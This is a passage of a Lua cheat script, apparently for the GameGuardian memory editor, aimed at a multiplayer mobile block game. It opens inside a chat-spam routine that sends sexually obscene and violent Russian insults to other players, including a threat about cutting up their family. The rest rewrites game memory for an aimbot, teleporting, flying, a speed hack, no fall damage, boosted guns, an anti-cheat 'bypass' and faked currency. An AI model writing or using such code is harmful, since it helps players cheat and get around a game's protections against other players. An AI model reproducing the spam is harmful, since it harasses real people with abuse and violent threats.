textsp228='жри кинжалы урoдище'
elseif spamtm<=2400 then
textsp228='я тебя мyчил урoд'
elseif spamtm<=2600 then
textsp228='хватит скyлить в xуú'
elseif spamtm<=2800 then
textsp228='скули больше в xуú'
elseif spamtm<=3000 then
textsp228='лижи мои яйца xyùсoc'
elseif spamtm<=3200 then
textsp228='я рвал твоё oчkо xyём'
elseif spamtm<=3400 then
textsp228='глотай xyú раб хyя'
elseif spamtm<=3600 then
textsp228='впитывай сперму губка'
elseif spamtm<=3800 then
textsp228='я насадил тебя на xyú'
elseif spamtm<=4000 then
textsp228='я рву пuзду твоей мамы'
elseif spamtm<=4200 then
textsp228='глотай мой xyú урод'
elseif spamtm<=4400 then
textsp228='ты – никчёмная xyúня'
elseif spamtm<=4600 then
textsp228='отлизывай пенис клоун'
elseif spamtm<=4800 then
textsp228='я твою семью резал'
elseif spamtm<=5000 then
textsp228='я резал твоё тупое тело'
elseif spamtm<=5200 then
textsp228='плачь в мой xyú мyдuла'
elseif spamtm<=5400 then
textsp228='иди на мой пенис урод'
elseif spamtm<=5600 then
textsp228='Ты — отброс общества'
elseif spamtm<=5800 then
textsp228='пей 999 литров спермы'
spamtm=0
end
Chat(colorsp..textsp228,true)
spamtm=spamtm+4
end
if tntTimer and Open.TimeTnt and Open.TimeTnt.value>0 and not tntTimeFull then
if Open.TimeTnt.value>60000 then
tntTimeFull=75000
elseif Open.TimeTnt.value>45000 then
tntTimeFull=60000
elseif Open.TimeTnt.value>30000 then
tntTimeFull=45000
else
tntTimeFull=30000
end
serverTime228=Open.ServerTime.value
WizardMain(UI1,'Успех!'..tntTimeFull,500,1,{1,1,0},true)
end
if tntTimeFull and Open.TimeTnt.value<=0 then
tntTimeFull=nil
serverTime228=nil
end
if tntTimer and serverTime228 and Open.ServerTime.value>serverTime228+tntTimeFull-500 then
tsp[3]=MainUI['AutoClicker']
end
if rgbnick and Open.View.value~=0 then
for i=1,#rgbnick do
if Open['RgbNick'..i].value~=-94 then
rgbnick=nil
end
end
if rgbnick then
color999='FF'..string.format("%02X%02X%02X",math.floor(r120*255),math.floor(g120*255),math.floor(b120*255))
textn={}
for i in color999:gmatch(utf8.charpattern) do
  t = utf8.codepoint(i)
  table.insert(textn,t)
end
for i=1,#rgbnick do
t=1
for b = 1,#textn do
tsp['rgbn'..i..b]={['address']=rgbnick[i].address+t,['flags']=1,['freeze']=true,['value']=textn[b]}t=t+1
end end
end
end

if SkyBlockGame and Open.generalSp.value==-0.10000000149011612 then
local a = Open.pitch.value * math.pi / -180
local b = Open.yaw.value * math.pi / 180
Main10['movX'].value=(math.cos(b)*math.sin(a))*2
Main10['movY'].value=(-math.sin(b))*2
Main10['movZ'].value=(math.cos(b)*math.cos(a))*2
fuckerbp=true
tsp.movX,tsp.movY,tsp.movZ,tsp.infoX,tsp.infoZ=Main10['movX'],Main10['movY'],Main10['movZ'],{address=Mag6[1].address+0x940,flags=16,freeze=true,value=999999},{address=Mag6[1].address+0x944,flags=16,freeze=true,value=999999}
elseif fuckerbp then
fuckerbp=false
Main10['movX'].value=0
Main10['movY'].value=0
Main10['movZ'].value=0
tsp.movX,tsp.movY,tsp.movZ=Main10['movX'],Main10['movY'],Main10['movZ']
WizardMain(UI1,'Success bypass!',500,1,{0,1,0},true)
elseif SkyBlockGame and Open.movX.value~=0 then
tsp.infoX,tsp.infoZ={address=Mag6[1].address+0x870,flags=16,freeze=true,value=0},{address=Mag6[1].address+0x874,flags=16,freeze=true,value=0}
end
if Open.SkyBlockDialog and Open.SkyBlockDialog.value==257 then
tsp.fuckDialog=Main10.SkyBlockDialog
end

if Open.ResetAndTp.value==1 and ResetAndTp~=228777 then
tsp.tpbtn2,tsp.tpbtn3,tsp.tpbtn4={address=MainUI.TP.address+0x144,flags=16,freeze=true,value=0},{address=MainUI.TP.address+0x148,flags=16,freeze=true,value=1},{address=MainUI.TP.address+0x14C,flags=16,freeze=true,value=0}
if ResetAndTp==0 then
ResetAndTp=currenttime
end
if ResetAndTp+0.500<currenttime then
tsp.x,tsp.y,tsp.z,tsp.x2,tsp.y2,tsp.z2,tsp.tpbtn2,tsp.tpbtn3,tsp.tpbtn4={address=Main10.X.address,flags=16,freeze=true,value=536.4},{address=Main10.Y.address,flags=16,freeze=true,value=1.16},{address=Main10.Z.address,flags=16,freeze=true,value=-136.6},{address=Main10.X.address+12,flags=16,freeze=true,value=537},{address=Main10.X.address+16,flags=16,freeze=true,value=2.96},{address=Main10.X.address+20,flags=16,freeze=true,value=-136},{address=MainUI.TP.address+0x144,flags=16,freeze=true,value=0.4},{address=MainUI.TP.address+0x148,flags=16,freeze=true,value=0.4},{address=MainUI.TP.address+0x14C,flags=16,freeze=true,value=0.4}
ResetAndTp=228777
end
elseif Open.ResetAndTp.value~=1 and ResetAndTp~=228777 and ResetAndTp~=0 then
ResetAndTp,tsp.tpbtn2,tsp.tpbtn3,tsp.tpbtn4=0,{address=MainUI.TP.address+0x144,flags=16,freeze=true,value=1},{address=MainUI.TP.address+0x148,flags=16,freeze=true,value=0},{address=MainUI.TP.address+0x14C,flags=16,freeze=true,value=0}
elseif Open.ResetAndTp.value~=1 and ResetAndTp==228777 then
ResetAndTp,tsp.tpbtn2,tsp.tpbtn3,tsp.tpbtn4=0,{address=MainUI.TP.address+0x144,flags=16,freeze=true,value=1},{address=MainUI.TP.address+0x148,flags=16,freeze=true,value=0},{address=MainUI.TP.address+0x14C,flags=16,freeze=true,value=0}
end
if Open.TPtime.value>0 or Open.Skilltime.value>0 then
tsp.timeTP=Main10.TPtime
tsp.timeSkill=Main10.SkillTime
end
if Open.timerUI1.value<999999 and myGameType ~= '1015' and not SkyBlockGame and myGameType ~= '1026' then
end
if Open.ArmSt.value==1 then
if Open.Shot1.value==0 and Open.Shot2.value==0 and timegun+0.200<currenttime then
tsp.gun1=MainUI.AutoReload
timegun=currenttime
end
tsp.gun2=MainUI.FastReload
end
if Open.Eating.value~=0 then
tsp.fasteat=Main10.Eating
end
if Open.ArmSt.value==256 and HideAttack then
tsp.attackCl=Main10.ArmSt
end
if myGameType=='1026' and myMap=='m1026_1' and not penis228 then
if Open.TPTNT.value==1 then
tsp.dkwsj=Main10.TPTNT
if not TPCh then
blink(true)
TPCh=Open.ServerTime.value
tsp.TPTNT1t={address=MainUI.TPTNT.address+0x154,flags=16,freeze=true,value=0}
tsp.TPTNT2t={address=MainUI.TPTNT.address+0x158,flags=16,freeze=true,value=1}
tsp.TPTNT3t={address=MainUI.TPTNT.address+0x15C,flags=16,freeze=true,value=0}

else
blink(false)
TPCh=nil
tsp.TPTNT1t={address=MainUI.TPTNT.address+0x154,flags=16,freeze=true,value=1}
tsp.TPTNT2t={address=MainUI.TPTNT.address+0x158,flags=16,freeze=true,value=0}
tsp.TPTNT3t={address=MainUI.TPTNT.address+0x15C,flags=16,freeze=true,value=0}
end
end
end
if TPCh then
Teleport('1523','28','-348')
tsp.yaw={address=Mag6[1].address-0xbc,flags=16,freeze=true,value=90}
if Open.View.value~=0 then
Main10['View'].value=0
tsp.view=Main10['View']
end
if TPCh+200<Open.ServerTime.value then
TPCh=(1488*1488)^3
tsp.click=MainUI['AutoClicker']
gg.clearList()
end
end

if Open.GunMain.value==257 and Open.wzrdIcon.value~=257 then
MainUI.wzrdIcon.value=257
tsp.wzrdIcon=MainUI.wzrdIcon
elseif Open.GunMain.value==1 and Open.wzrdIcon.value~=1 then
MainUI.wzrdIcon.value=1
tsp.wzrdIcon=MainUI.wzrdIcon
end

if not Main10.BtnAttackKrest then
Main10.BtnAttackKrest,Open.BtnAttackKrest=MainUI.BtnAttackKrest,MainUI.BtnAttackKrest
end
if Open.BtnAttackKrest.value~=1 then
tsp.fuckuiattack=MainUI.BtnAttackKrest
end
if BasicGames1 and Open.Glide.value==257 then
tsp.hideglide={address=MainUI.Glide.address,flags=4,freeze=true,value=1} end
if Open.AutoRun.value==1 then
tsp.RmAutoRun=Main10.AutoRun
end
if not SkyBlockGame and Open.Skill.value~=257 and Open.GunMain.value~=257 then
tsp.skill,tsp.skill1,tsp.skill2=MainUI['SkillBtn'],MainUI['SkillMain'],MainUI['SkillEffect']
elseif Open.Skill.value==257 and Open.GunMain.value==257 then
tsp.skill,tsp.skill1,tsp.skill2={address=MainUI['SkillBtn'].address,flags=4,freeze=true,value=1},{address=MainUI['SkillMain'].address,flags=4,freeze=true,value=1},MainUI['SkillEffect']
end
if not SkyBlockGame and Open.AttackSt.value==120 and SkillAt>0 then
tsp.skill7,tsp.skill8,tsp.skill9,tsp.skill10,tsp.skill11={address=MainUI['Krest'].address,flags=4,freeze=true,value=1},{address=MainUI['SkillBtn'].address+0x144,flags=16,freeze=true,value=1},{address=MainUI['SkillBtn'].address+0x148,flags=16,freeze=true,value=0},{address=MainUI['SkillBtn'].address+0x14C,flags=16,freeze=true,value=1},MainUI.BtnAttackKrest
tsp[3]={address=MainUI['AutoClicker'].address,flags=4,freeze=true,value=0}
if not NoDelayStatus then
NoDelay(false,true)
end
SkillAt=SkillAt-1
elseif not SkyBlockGame and Open.AttackSt.value~=120 then
tsp.skill7,tsp8,tsp.skill9,tsp.skill10,tsp.skill11,tsp.skill12=MainUI['Krest'],{address=MainUI['SkillBtn'].address+0x144,flags=16,freeze=true,value=red089},{address=MainUI['SkillBtn'].address+0x148,flags=16,freeze=true,value=0},{address=MainUI['SkillBtn'].address+0x14C,flags=16,freeze=true,value=0},MainUI.BtnAttackKrest
if not NoDelayStatus then
NoDelay(true,true)
end
if (Open.CurrentAim and Open.CurrentAim.value==1 or (Open.BowUI.value==257 and Open.GunCross.value==257)) and not onliclik then
tsp[3]={address=MainUI['AutoClicker'].address,flags=4,freeze=true,value=2}
SkillAt=5
else
tsp[3]=MainUI['AutoClicker']
SkillAt=5
end
end
if not SkyBlockGame and Open.MainAttackBtn.value~=257 and Open.GunMain.value~=257 then
tsp.att1=Main10.MainAttackBtn
elseif not SkyBlockGame and Open.MainAttackBtn.value==257 and Open.GunMain.value==257 then
tsp.att1={address=Main10.MainAttackBtn.address,flags=4,freeze=true,value=1}
end
if (Open.SkillX.value~=Open.AttackX.value or Open.SkillY.value~=Open.AttackY.value) then
if NoDelayStatus then
NoDelay(false,true)NoDelayStatus=nil
end
tsp.skill3,tsp.skill4,tsp.skill5,tsp.skill6={address=MainUI['SkillBtn'].address+0xA0,flags=16,freeze=true,value=Open.AttackX.value},{address=MainUI['SkillBtn'].address+0xA4,flags=16,freeze=true,value=Open.AttackY.value},{address=MainUI['SkillBtn'].address+0xA8,flags=16,freeze=true,value=Open.AttackX.value+120},{address=MainUI['SkillBtn'].address+0xAC,flags=16,freeze=true,value=Open.AttackY.value+120}
end
if Open.RazmerNika.value~=wzrdramka and wzrdramka then
if wzrdramka2 then
gg.alert("исправление ника",'')wzrdramka2=nil
end
for i=1,#spisoknika do
tsp['lolxd'..i]=spisoknika[i]
end
tsp.enable228={address=Open.RazmerNika.address,flags=4,freeze=true,value=wzrdramka}
wzrdramka2=true
end
if Open.JumpSt.value==1 and Open['ParachuteSt'].value~=256 and not nofallst2 then
tsp.wzrd1={address=UI7[1].address+12,flags=2,freeze=true,value=256}
elseif Open.JumpSt.value==257 and Open['ParachuteSt'].value~=0 and not BasicGames1 then
tsp.wzrd1={address=UI7[1].address+12,flags=2,freeze=true,value=0}
end
if swimst2 and Open['SwimST'].value==1 then
tsp.sw,swimst2={address=getMainXa-508,flags=16,freeze=true,value=0.25},nil
elseif swimst2 and Open['SwimST'].value==0 then
tsp.sw,swimst2={address=getMainXa-508,flags=16,freeze=true,value=0.02},nil
end
if nofallst and Open['Paraplane'].value==1 and not nofallst2 and Open['Ground'].value~=257 and not BasicGames1 then
if BASGame then
undon=0x10
else
undon=0
end
tsp.prp1,tsp.prp2,tsp.prp3,nofallst,nofallst2,tsp.prp4,tsp.wzrd1={address=UI7[1].address+0x144+undon,flags=16,freeze=true,value=0},{address=UI7[1].address+0x148+undon,flags=16,freeze=true,value=1},{address=UI7[1].address+0x14C+undon,flags=16,freeze=true,value=0},nil,true,{address=MainUI.Glide.address+12,flags=2,freeze=true,value=0},{address=UI7[1].address+12,flags=2,freeze=true,value=t}
if BASGame then
tsp.nf1,tsp.nf2={address=UI7[1].address+0x940+raznica,flags=16,freeze=true,value=0.7},{address=UI7[1].address+0x944+raznica,flags=16,freeze=true,value=0.7}
WizardMain(UI1,'Undead [ON]',1000,1,{0,1,0})
else
WizardMain(UI1,'No Fall dmg [ON]',1000,1,{0,1,0})
end
elseif nofallst and Open['Paraplane'].value==0 and nofallst2 then
tsp.prp1,tsp.prp2,tsp.prp3,nofallst,nofallst2,tsp.prp4={address=UI7[1].address+0x144+undon,flags=16,freeze=true,value=1},{address=UI7[1].address+0x148+undon,flags=16,freeze=true,value=0},{address=UI7[1].address+0x14C+undon,flags=16,freeze=true,value=0},nil,nil,{address=MainUI.Glide.address+12,flags=2,freeze=true,value=256}
if BASGame then
tsp.nf1,tsp.nf2={address=UI7[1].address+0x940+raznica,flags=16,freeze=true,value=0.7},{address=UI7[1].address+0x944+raznica,flags=16,freeze=true,value=0.7}
WizardMain(UI1,'Undead [OFF]',1000,1,{1,0,0})
else
WizardMain(UI1,'No Fall dmg [OFF]',1000,1,{1,0,0})
end
end
if Open['Нажатие'].value==2 and (Open.BowUI.value==257 and Open.GunCross.value==257) and not SkyBlockGame and Open.AttackSt.value~=120 then
tsp[3]={address=MainUI['AutoClicker'].address,flags=4,freeze=true,value=0}
end
if Open.FlyUpSp.value==39 then
tsp.flysp={address=Main10['Y'].address,flags=16,freeze=true,value=Open.Y.value+0.2}
tsp.flysp2={address=Main10['Y'].address+12,flags=16,freeze=true,value=(Open.Y.value+1.8)+0.2}
elseif Open.FlyDownSp.value==38 then
tsp.flysp={address=Main10['Y'].address,flags=16,freeze=true,value=Open.Y.value-0.2}
tsp.flysp2={address=Main10['Y'].address+12,flags=16,freeze=true,value=(Open.Y.value+1.8)-0.2}
end
if Open.SpeedOn.value==257 and not speedbtn then
speedbtn=true
elseif Open.SpeedOff.value==257 and speedbtn then
speedbtn=false
end
if speedbtn and speedhax then
tsp.gmsp=speedhax end
if blocksst then
if Open['Нажатие'].value==2 then
tsp.blst={address=gtblo+96,flags=16,freeze=true,value='-6.13017998e13'}
else
tsp.blst={address=gtblo+96,flags=16,freeze=true,value='-3.47665818e10'}
end
end
if Open.Mat1 and Open.Mat2 and (Open.Mat1.value~=257 or Open.Mat2.value~=257) then
tsp.mat1,tsp.mat2=Main10.Mat1,Main10.Mat2
end
if ChangeNickSize then
tsp[26]={address=MainUI.Wizard13.address+0x3C,flags=16,freeze=true,value=1+NickSizeVal}
ChangeNickSize=nil
end
if ChangeShowAnim then
tsp.updateclient={address=Mag6[1].address+0x578,flags=1,freeze=true,value=1}
if Open['CurrentAnim'].value == 0 then
t=WizardAnim[1]
elseif Open['CurrentAnim'].value == 1 then
t=WizardAnim[2]
elseif Open['CurrentAnim'].value == 2 then
t=WizardAnim[3]
elseif Open['CurrentAnim'].value == 3 then
t=WizardAnim[4]
elseif Open['CurrentAnim'].value == 4 then
t=WizardAnim[5]
elseif Open['CurrentAnim'].value == 5 then
t=WizardAnim[6]
elseif Open['CurrentAnim'].value == 6 then
t=WizardAnim[7]
elseif Open['CurrentAnim'].value == 7 then
t=WizardAnim[8]
elseif Open['CurrentAnim'].value == 8 then
t=WizardAnim[9]
elseif Open['CurrentAnim'].value == 9 then
t=WizardAnim[10]
elseif Open['CurrentAnim'].value == 10 then
t=WizardAnim[11]
elseif Open['CurrentAnim'].value == 11 then
t=WizardAnim[12]
elseif Open['CurrentAnim'].value == 12 then
t=WizardAnim[13]
elseif Open['CurrentAnim'].value == 13 then
t=WizardAnim[14]
elseif Open['CurrentAnim'].value == 14 then
t=WizardAnim[15]
elseif Open['CurrentAnim'].value == 15 then
t=WizardAnim[16]
elseif Open['CurrentAnim'].value == 16 then
t=WizardAnim[17]
elseif Open['CurrentAnim'].value == 17 then
t=WizardAnim[18]
elseif Open['CurrentAnim'].value == 18 then
t=WizardAnim[19]
elseif Open['CurrentAnim'].value == 19 then
t=WizardAnim[20]
elseif Open['CurrentAnim'].value == 20 then
t=WizardAnim[20]
elseif Open['CurrentAnim'].value == 1000 then
t=WizardAnim[21]
elseif Open['CurrentAnim'].value == 1001 then
t=WizardAnim[22]
elseif Open['CurrentAnim'].value == 1002 then
t=WizardAnim[23]
elseif Open['CurrentAnim'].value == 1003 then
t=WizardAnim[24]
elseif Open['CurrentAnim'].value == 1004 then
t=WizardAnim[25]
elseif Open['CurrentAnim'].value == 1005 then
t=WizardAnim[26]
elseif Open['CurrentAnim'].value == 1006 then
t=WizardAnim[27]
elseif Open['CurrentAnim'].value == 1007 then
t=WizardAnim[28]
elseif Open['CurrentAnim'].value == 1008 then
t=WizardAnim[29]
elseif Open['CurrentAnim'].value == 1009 then
t=WizardAnim[30]
elseif Open['CurrentAnim'].value == 1010 then
t=WizardAnim[31]
elseif Open['CurrentAnim'].value == 1011 then
t=WizardAnim[32]
elseif Open['CurrentAnim'].value == 1012 then
t=WizardAnim[33]
elseif Open['CurrentAnim'].value == 1013 then
t=WizardAnim[34]
elseif Open['CurrentAnim'].value == 2000 then
t=WizardAnim[35]
else
t='nil'
end
text='Anim: ▢FFFF0000'..t
ChangeShowAnim={} 
for i in text:gmatch(utf8.charpattern) do
  t = utf8.codepoint(i)
  table.insert(ChangeShowAnim,t)
end
t=0
for b = 1,WizardUtf8.len(text) do
tsp['ы1ы'..b]={['address']=MainUI['ShowAnims'].address+0x8A0+raznica+t,['flags']=2,['freeze']=true,['value']=ChangeShowAnim[b]}t=t+2
end
tsp['ы1ы']={['address']=MainUI['ShowAnims'].address+0x878+raznica,['flags']=4,['freeze']=true,['value']=WizardUtf8.len(text)}
tsp['ы1ыы']={['address']=MainUI['ShowAnims'].address+0x938+raznica,['flags']=16,['freeze']=true,['value']=-1}
ChangeShowAnim=nil
end


if ServTime~=string.format("%d",math.floor((Open.ServerTime.value/1000)+0.5)) then
ServTime=string.format("%d",math.floor((Open.ServerTime.value/1000)+0.5))
texts='My Time On Server: ▢FFFF0000'..ServTime
servt={} 
for i in texts:gmatch(utf8.charpattern) do
  t = utf8.codepoint(i)
  table.insert(servt,t)
end
t=0
for b = 1,WizardUtf8.len(texts) do
tsp['ыы1'..b]={['address']=MainUI['ServTime'].address+0x8A0+raznica+t,['flags']=2,['freeze']=true,['value']=servt[b]}t=t+2
end
tsp['ыы1']={['address']=MainUI['ServTime'].address+0x878+raznica,['flags']=4,['freeze']=true,['value']=WizardUtf8.len(texts)}
tsp['ыыы1']={['address']=MainUI['ServTime'].address+0x938+raznica,['flags']=16,['freeze']=true,['value']=-1}
end



if MyTime~=os.date'%H:%M:%S' then
MyTime=os.date'%H:%M:%S'
textr='My Time: ▢FFFF0000'..MyTime
servr={} 
for i in textr:gmatch(utf8.charpattern) do
  t = utf8.codepoint(i)
  table.insert(servr,t)
end
t=0
for b = 1,WizardUtf8.len(textr) do
tsp['ыы2'..b]={['address']=MainUI['MyTime'].address+0x8A0+raznica+t,['flags']=2,['freeze']=true,['value']=servr[b]}t=t+2
end
tsp['ыы2']={['address']=MainUI['MyTime'].address+0x878+raznica,['flags']=4,['freeze']=true,['value']=WizardUtf8.len(textr)}
tsp['ыыы2']={['address']=MainUI['MyTime'].address+0x938+raznica,['flags']=16,['freeze']=true,['value']=-1}
end



if Open.Break.value==1 then
if not holdbtnbr then
holdbtnbr=Open.ServerTime.value
end
if holdbtnbr+300<Open.ServerTime.value then
tsp.rgbover={address=Open.Break.address,flags=1,freeze=true,value=0}
triggerbr=true
end
elseif holdbtnbr then
if triggerbr then
SetBlock()
else
if not fastonbr then
FastBreak(true)
tsp.br1,tsp.br2,tsp.br3={address=MainUI.WarBlock.address+0x144,flags=16,freeze=true,value=0},{address=MainUI.WarBlock.address+0x148,flags=16,freeze=true,value=1},{address=MainUI.WarBlock.address+0x14c,flags=16,freeze=true,value=0}
else
FastBreak(false)
tsp.br1,tsp.br2,tsp.br3={address=MainUI.WarBlock.address+0x144,flags=16,freeze=true,value=1},{address=MainUI.WarBlock.address+0x148,flags=16,freeze=true,value=0},{address=MainUI.WarBlock.address+0x14c,flags=16,freeze=true,value=0}
end
end
triggerbr,holdbtnbr=nil,nil
end
if Open.wzrdgun.value==1 then
if not wzrdguns then
wzrdguns=getGuns()
end
if not wzrdgun then
wzrdgun=true
for i=1,#wzrdguns do
tsp['ор'..i]={address=wzrdguns[i].address+0x74,flags=16,freeze=true,value=10}
tsp['ор'..#wzrdguns+i]={address=wzrdguns[i].address+0x84,flags=16,freeze=true,value=999}
tsp['ор'..#wzrdguns*2+i]={address=wzrdguns[i].address+0x8c,flags=16,freeze=true,value=0}
tsp['ор'..#wzrdguns*3+i]={address=wzrdguns[i].address+0x7c,flags=16,freeze=true,value=0}
tsp['ор'..#wzrdguns*4+i]={address=wzrdguns[i].address+0x90,flags=16,freeze=true,value=0}
tsp['ор'..#wzrdguns*5+i]={address=wzrdguns[i].address+0x68,flags=16,freeze=true,value=1488}
tsp['ор'..#wzrdguns*6+i]={address=wzrdguns[i].address+0x224,flags=16,freeze=true,value=100}
tsp['ор'..#wzrdguns*7+i]={address=wzrdguns[i].address+0x228,flags=16,freeze=true,value=0}
tsp['ор'..#wzrdguns*8+i]={address=wzrdguns[i].address+0x1c,flags=4,freeze=true,value=1}
end
tsp.ic1,tsp.ic2,tsp.ic3={address=MainUI.wzrdIcon.address+0x144,flags=16,freeze=true,value=0},{address=MainUI.wzrdIcon.address+0x148,flags=16,freeze=true,value=1},{address=MainUI.wzrdIcon.address+0x14c,flags=16,freeze=true,value=0}
if not defaultGuns then
defaultGuns={}
for i=1,#wzrdguns*8 do
defaultGuns[i]=tsp['ор'..i]
end
defaultGuns=gg.getValues(defaultGuns)
end
else
wzrdgun=nil
for i=1,#defaultGuns do
tsp['defg'..i]={address=defaultGuns[i].address,flags=defaultGuns[i].flags,freeze=true,value=defaultGuns[i].value}
end
tsp.ic1,tsp.ic2,tsp.ic3={address=MainUI.wzrdIcon.address+0x144,flags=16,freeze=true,value=1},{address=MainUI.wzrdIcon.address+0x148,flags=16,freeze=true,value=0},{address=MainUI.wzrdIcon.address+0x14c,flags=16,freeze=true,value=0}
end
tsp.wzrdgun=Main10.wzrdgun
end
if Open.RGB.value==1 then
if not holdbtn1 then
holdbtn1=Open.ServerTime.value
end
if holdbtn1+300<Open.ServerTime.value then
tsp.rgbover={address=Open.RGB.address,flags=1,freeze=true,value=0}
triggerHold2=true
end
elseif holdbtn1 then
if triggerHold2 then
if not skinchanger then
skinchanger=true
tsp.wzrf,tsp.wzrf1,tsp.wzrf2,tsp.wzrf3,tsp.wzrf4,tsp.wzrf5,tsp.wzrf6={address=MainUI['Fishing'].address+0x878+raznica,flags=4,freeze=true,value=4},{address=MainUI['Fishing'].address+0x8A0+raznica,flags=2,freeze=true,value=';S'},{address=MainUI['Fishing'].address+0x8A2+raznica,flags=2,freeze=true,value=';k'},{address=MainUI['Fishing'].address+0x8A4+raznica,flags=2,freeze=true,value=';i'},{address=MainUI['Fishing'].address+0x8A6+raznica,flags=2,freeze=true,value=';n'},{address=MainUI['Fishing'].address+0x8E8+raznica,flags=16,freeze=true,value=45},{address=MainUI['Fishing'].address+0x938+raznica,flags=16,freeze=true,value=-1}
else
skinchanger=false
tsp.wzrf,tsp.wzrf1,tsp.wzrf2,tsp.wzrf3,tsp.wzrf4,tsp.wzrf5={address=MainUI['Fishing'].address+0x878+raznica,flags=4,freeze=true,value=3},{address=MainUI['Fishing'].address+0x8A0+raznica,flags=2,freeze=true,value=82},{address=MainUI['Fishing'].address+0x8A2+raznica,flags=2,freeze=true,value=71},{address=MainUI['Fishing'].address+0x8A4+raznica,flags=2,freeze=true,value=66},{address=MainUI['Fishing'].address+0x8E8+raznica,flags=16,freeze=true,value=45},{address=MainUI['Fishing'].address+0x938+raznica,flags=16,freeze=true,value=-1}
end
else
if not rgbchams and not skinchanger then
rgbchams=true t=color123(1.8,1.8,1.8)
elseif not skinchanger then
if BedWarGame then
Main10.BedWarBP.value=5
tsp.bpbed=Main10.BedWarBP
end
rgbchams=false t=color123(nil,nil,nil)MainUI['Wizard228'].value,MainUI['Wizard225'].value,MainUI['Wizard229'].value=1,1,1 tsp.penis1,tsp.penis2,tsp.penis3,tsp.penis4,tsp.penis5,tsp.penis6,tsp.penis7,tsp.penis8,tsp.penis9=MainUI['Wizard228'],MainUI['Wizard225'],MainUI['Wizard229'],{address=MainUI['Fishing'].address+0x154,flags=16,freeze=true,value=1},{address=MainUI['Fishing'].address+0x158,flags=16,freeze=true,value=0},{address=MainUI['Fishing'].address+0x15C,flags=16,freeze=true,value=0},{address=MainUI['Fly'].address+0x144,flags=16,freeze=true,value=1},{address=MainUI['Fly'].address+0x148,flags=16,freeze=true,value=0},{address=MainUI['Fly'].address+0x14C,flags=16,freeze=true,value=0}
else SkinChanger() end if not skinchanger then for i=1,#t do tsp['chams'..i]=t[i] end end end holdbtn1,triggerHold2=nil,nil end
if Open.WizardAttack.value==1 then
if not holdAttack then
holdAttack=Open.ServerTime.value
end
if holdAttack+300<Open.ServerTime.value then
triggerHold=true
tsp.holdover={address=Open.WizardAttack.address,flags=1,freeze=true,value=0}
end
elseif holdAttack then
holdAttack=nil
if not aimbotst1 then
if not triggerHold then
if TPKiller then
TPKiller=nil
if not BedWarGame and myGameType~='1026' then
blink(false)
end
end
val=0 
else
val=1
end
tsp.at1,tsp.at2,tsp.at3,tsp.at4={address=MainUI['wizardtnt2'].address+0x144,flags=16,freeze=true,value=1},{address=MainUI['wizardtnt2'].address+0x148,flags=16,freeze=true,value=val},{address=MainUI['wizardtnt2'].address+0x14C,flags=16,freeze=true,value=0}
gg.addListItems({tsp.at1,tsp.at2,tsp.at3,{address=MainUI['wizardtnt2'].address+0xC,flags=2,freeze=true,value=0}})gg.clearList()
TargetRadius=99999
GetWizardValue()
Main10['CurrentAim']={address=WizardValue[1].address-412,flags=4}
AutoClickerStatus=true
AimBot()
gg.addListItems({tsp.at1,tsp.at2,tsp.at3,{address=MainUI['wizardtnt2'].address+0xC,flags=2,freeze=true,value=256}})gg.clearList()
Wzrdattacker=true
else
if triggerHold and TPKiller then
TPKiller=nil
blink(false)
tsp.at1,tsp.at2,tsp.at3={address=MainUI['wizardtnt2'].address+0x144,flags=16,freeze=true,value=1},{address=MainUI['wizardtnt2'].address+0x148,flags=16,freeze=true,value=0},{address=MainUI['wizardtnt2'].address+0x14C,flags=16,freeze=true,value=0}
elseif triggerHold and not TPKiller then
TPKiller=true
tsp.at1,tsp.at2,tsp.at3={address=MainUI['wizardtnt2'].address+0x144,flags=16,freeze=true,value=1},{address=MainUI['wizardtnt2'].address+0x148,flags=16,freeze=true,value=1},{address=MainUI['wizardtnt2'].address+0x14C,flags=16,freeze=true,value=0}
else
if TPKiller then
TPKiller=nil
blink(false)
end
GetWizardValue()
Main10['CurrentAim']={address=WizardValue[1].address-412,flags=4}
AutoClickerStatus=false
tsp.krest={address=MainUI['Krest'].address,flags=4,freeze=true,value=1}krestik=false
MainUI.PCValue.value=0
tsp.pcver=MainUI.PCValue
PCVersionSt=false
tsp.at1,tsp.at2,tsp.at3={address=MainUI['wizardtnt2'].address+0x144,flags=16,freeze=true,value=0},{address=MainUI['wizardtnt2'].address+0x148,flags=16,freeze=true,value=0},{address=MainUI['wizardtnt2'].address+0x14C,flags=16,freeze=true,value=1} gg.addListItems({tsp.at1,tsp.at2,tsp.at3})gg.clearList()
gg.clearResults()len,AimKiller=70,false  len=70 antiCrash2() gg.addListItems(ar123)aimbotst=nil gg.clearList() aimbotst1=false
Wzrdattacker=nil gg.copyText(IDPL)
end
end
triggerHold=nil
end

if Wzrdattacker and not aimbotst1 then
GetWizardValue()
Main10['CurrentAim']={address=WizardValue[1].address-412,flags=4}
AutoClickerStatus=false
tsp.krest={address=MainUI['Krest'].address,flags=4,freeze=true,value=1}krestik=false
MainUI.PCValue.value=0
tsp.pcver=MainUI.PCValue
PCVersionSt=false
tsp.at1,tsp.at2,tsp.at3={address=MainUI['wizardtnt2'].address+0x144,flags=16,freeze=true,value=0},{address=MainUI['wizardtnt2'].address+0x148,flags=16,freeze=true,value=0},{address=MainUI['wizardtnt2'].address+0x14C,flags=16,freeze=true,value=1} gg.addListItems({tsp.at1,tsp.at2,tsp.at3})gg.clearList()
gg.clearResults()len,AimKiller=70,false  len=70 antiCrash2() gg.addListItems(ar123)aimbotst=nil gg.clearList() aimbotst1=false
Wzrdattacker=nil
end
if Open['Fishing'].value~=257 then
MainUI['Fishing'].value=257
tsp[25]=MainUI['Fishing']
end

if freegc then
if #uifree>#gchave.money then
t=#uifree
else
t=#gchave.money
end
for i=1,t do
if i<=#gchave.money then
tsp['gc'..i]={address=gchave.gcubes[i].address,flags=4,freeze=true,value=Open.ServerTime.value}
tsp['mn'..i]={address=gchave.money[i].address,flags=4,freeze=true,value=Open.ServerTime.value}
end
if i<=#uifree then
tsp['UIR'..i]={address=uifree[i].address+0x154,flags=16,freeze=true,value=r120}
tsp['UIG'..i]={address=uifree[i].address+0x158,flags=16,freeze=true,value=g120}
tsp['UIB'..i]={address=uifree[i].address+0x15c,flags=16,freeze=true,value=b120}
end
end
end

if rotationMenu then
if rotationMenu==360 then
rotationMenu=0
end
if Open['PRP'].value~=-1 or Open.PRP2.value~=0 then
tsp[24]=Main10['PRP']
tsp.fallprp=Main10.PRP2
end
if Open['Parachute'].value==1 and (Open['Ground'].value~=257 or BasicGames1) then
if BasicGames1 then
if not holdbtnpr then
holdbtnpr=Open.ServerTime.value
end
if holdbtnpr+300<Open.ServerTime.value then
